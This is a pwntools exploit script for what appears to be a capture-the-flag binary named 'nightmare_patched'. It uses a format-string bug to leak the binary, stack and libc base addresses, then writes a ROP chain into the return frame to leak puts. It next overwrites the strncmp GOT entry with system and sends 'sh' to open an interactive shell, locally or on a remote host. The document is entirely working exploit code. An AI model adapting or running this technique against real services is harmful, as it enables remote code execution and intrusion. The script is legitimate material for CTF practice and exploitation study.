#!/usr/bin/env python3

from pwn import *

e = ELF("./nightmare_patched")
libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      set breakpoint pending on
                      # b __libc_start_call_main
                      b __libc_start_main
                      command 1
                        # fprintf() in scream()
                        set $a = $rdi - 0x14f + 0x63
                        b *$a
                        # second printf() in escape()
                        set $a = $rdi - 0xa0 + 0x60
                        b *$a
                        c
                      end
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()
    
    # FSB to leak binary/libc addresses + GOT

    # Step 1: leak binary and stack addresses.
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'>>', b'%1$p')
    leaked_bin = int(r.recvline(), 16)
    e.address = leaked_bin - 0x2079
    info(f'binary base address is {hex(e.address)}')
    main_addr = e.address + 0x1478
    info(f'main() address is {hex(main_addr)}')

    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'>>', b'%8$p')
    leaked_stack_addr = int(r.recvline(), 16)
    scream_ret_frame_addr = leaked_stack_addr - 0x18
    info(f'scream() return frame is at {hex(scream_ret_frame_addr)}')

    # Step 2: output libc address.
    OFFSET = 5  # Found via r.sendlineafter(b'>>', b'AAAAAAAA%p%p%p%p%p') in local run (we can see stderr locally).
    pop_rdi_ret_addr = next(e.search(asm('pop rdi; ret'), executable=True))
    r.sendlineafter(b'>', b'1')
    payload = fmtstr_payload(offset=OFFSET, writes={
        scream_ret_frame_addr: pop_rdi_ret_addr,
        scream_ret_frame_addr + 8: e.got.puts,
        scream_ret_frame_addr + 16: e.plt.puts,
        scream_ret_frame_addr + 24: main_addr,
        }, write_size='short')
    info(f'payload size is {len(payload)}')
    r.sendlineafter(b'>>', payload)
    puts_addr = u64(r.recvline()[-7:-1] + b'\x00' * 2)
    info(f'puts() is at {hex(puts_addr)}')
    libc.address = puts_addr - libc.sym.puts
    info(f'libc base address is at {hex(libc.address)}')

    # Step 3: overwrite the strncmp() to system()
    r.sendlineafter(b'>', b'1')
    payload = fmtstr_payload(offset=OFFSET, writes={
        e.got.strncmp: libc.sym.system,
        }, write_size='short')
    info(f'payload size is {len(payload)}')
    r.sendlineafter(b'>>', payload)

    # Step 4: trigger the strncmp() and pass `/bin/sh`
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'>>', b'sh\x00')

    r.interactive()

if __name__ == "__main__":
    main()
